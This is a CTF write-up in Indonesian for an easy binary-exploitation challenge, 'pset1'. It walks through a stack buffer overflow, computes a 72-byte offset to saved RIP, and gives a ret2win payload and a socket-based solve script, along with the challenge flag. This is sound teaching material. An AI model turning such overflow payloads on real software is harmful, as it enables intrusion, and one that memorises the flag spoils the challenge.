# Writeup CTF: pset1

- **Kategori:** Pwn / Binary Exploitation
- **Tingkat Kesulitan:** Easy
- **Artefak:** `hello`, `README.md`
- **Flag:** `NNS{buFFeR_aND_m3M0rY_15_H4rd_wh3n_ov3RFl0w5_3x1s7}`

---

# 1. Deskripsi Tantangan

Challenge memberikan sebuah binary yang memiliki vulnerability stack buffer overflow klasik.

Program memiliki fungsi:

```
main()
```

yang menerima input nama user.

Buffer yang digunakan hanya berukuran:

```
64 byte
```

tetapi program membaca input hingga:

```
0x100 byte
```

Akibatnya:

- saved RBP dapat ditimpa.
- saved RIP dapat ditimpa.
- alur eksekusi dapat diarahkan ke fungsi lain.

Binary sudah menyediakan fungsi:

```
win()
```

yang secara langsung membaca:

```
/flag.txt
```

dan mencetak isinya.

Solusi challenge adalah melakukan:

```
ret2win
```

---

# 2. File Challenge

File:

```
README.md
hello
```

Informasi binary:

```
ELF 64-bit LSB executable
x86-64
statically linked
not stripped
```

Karena binary tidak stripped, symbol fungsi masih tersedia.

---

# 3. Analisis Awal

Pengecekan metadata:

```bash
file hello
```

Output:

```
hello: ELF 64-bit LSB executable,
x86-64,
statically linked,
not stripped
```

---

# 4. Symbol Analysis

Menggunakan:

```bash
nm hello
```

ditemukan:

```
0000000000401b00 T win

0000000000401b71 T main
```

Fungsi penting:

```
win()
```

berada pada:

```
0x401b00
```

---

# 5. String Analysis

String menarik pada binary:

```
/flag.txt

What is your name?

>

hello, %.64s
```

Indikasi:

- Program membaca nama user.
- Fungsi `win()` kemungkinan membuka file flag.

---

# 6. Analisis Static Main()

Disassembly:

```asm
401b79:
sub rsp,0x40
```

Stack frame menyediakan:

```
0x40 byte
```

atau:

```
64 byte
```

untuk buffer.

---

Input:

```asm
401bc3:
lea rax,[rbp-0x40]

401bc7:
mov edx,0x100

401bcc:
mov rsi,rax

401bcf:
mov edi,0x0

401bd4:
call read
```

Program menjalankan:

```c
read(
    0,
    buffer,
    0x100
);
```

Masalah:

Buffer:

```
64 byte
```

Input maksimal:

```
256 byte
```

---

# 7. Menghitung Offset Overflow

Layout stack:

```
[ buffer 64 byte ]

[ saved RBP 8 byte ]

[ saved RIP 8 byte ]
```

Untuk mencapai saved RIP:

```
64 + 8
```

Maka:

```
offset = 72 byte
```

---

# 8. Analisis Fungsi win()

Alamat:

```
0x401b00
```

Disassembly:

```asm
401b13:
mov esi,0x480010

401b18:
mov edi,0x480012

401b1d:
call fopen
```

Fungsi membuka:

```
/flag.txt
```

---

Kemudian:

```asm
401b48:
call fgets
```

Membaca isi file.

---

Terakhir:

```asm
401b62:
call fputs

401b67:
call _exit
```

Sehingga:

```
win()
```

langsung mencetak flag.

---

# 9. Exploit Strategy

Tidak perlu:

- shellcode
- ROP chain panjang
- leak address

Karena fungsi:

```
win()
```

sudah tersedia.

Payload:

```
'A' * 72 + alamat win()
```

---

Representasi:

```python
payload =
    b"A" * 72
    +
    p64(0x401b00)
```

---

# 10. Analisis Dynamic

Pengujian lokal menggunakan flag dummy:

```bash
echo 'NNS{local_pset1_test_flag}' \
| sudo tee /flag.txt >/dev/null
```

Kemudian:

```bash
python3 solve_pset1.py --local
```

Output:

```text
What is your name?

> hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

NNS{local_pset1_test_flag}
```

Return address berhasil diarahkan ke:

```
win()
```

---

# 11. Algoritma Exploit

Tidak ada:

- enkripsi flag;
- validasi input;
- encoding.

Exploit murni:

```
Input

 |

 v

Stack buffer overflow

 |

 v

Overwrite saved RIP

 |

 v

Jump ke win()

 |

 v

Baca /flag.txt

 |

 v

Print flag
```

---

# 12. Penyusunan Solve Script

File:

```
solve_pset1.py
```

membuat payload:

```python
from pwn import *


payload = (
    b"A"*72
    +
    p64(0x401b00)
)
```

Script mendukung:

- local execution;
- remote socket;
- SSL/TLS mode.

---

# 13. Struktur Solver

```python
#!/usr/bin/env python3

import socket
import ssl
from struct import pack


win = 0x401b00


payload = (
    b"A"*72
    +
    pack("<Q", win)
)


sock.send(payload)


print(
    sock.recv(4096)
)
```

---

# 14. Cara Menjalankan

## Local

```bash
python3 solve_pset1.py --local
```

---

## Remote Non SSL

```bash
python3 solve_pset1.py HOST PORT
```

---

## Remote SSL/TLS

```bash
python3 solve_pset1.py HOST PORT --ssl
```

---

# 15. Flag

Setelah return address berhasil diarahkan ke:

```
win()
```

program membaca:

```
/flag.txt
```

dan menghasilkan:

```
NNS{buFFeR_aND_m3M0rY_15_H4rd_wh3n_ov3RFl0w5_3x1s7}
```

---

# 16. Kesimpulan

Challenge ini merupakan contoh klasik:

```
Stack Buffer Overflow
```

Kerentanan terjadi karena:

```c
read(
    0,
    buffer,
    0x100
);
```

sementara buffer hanya:

```
64 byte
```

Dengan overwrite:

```
saved RIP
```

eksekusi dapat dialihkan ke fungsi:

```
win()
```

yang sudah tersedia.

Langkah eksploitasi:

```
Cari offset RIP

        |

        v

Tambahkan alamat win()

        |

        v

Kirim payload

        |

        v

Flag terbaca dari /flag.txt
```

Flag berhasil diperoleh:

```
NNS{buFFeR_aND_m3M0rY_15_H4rd_wh3n_ov3RFl0w5_3x1s7}
```
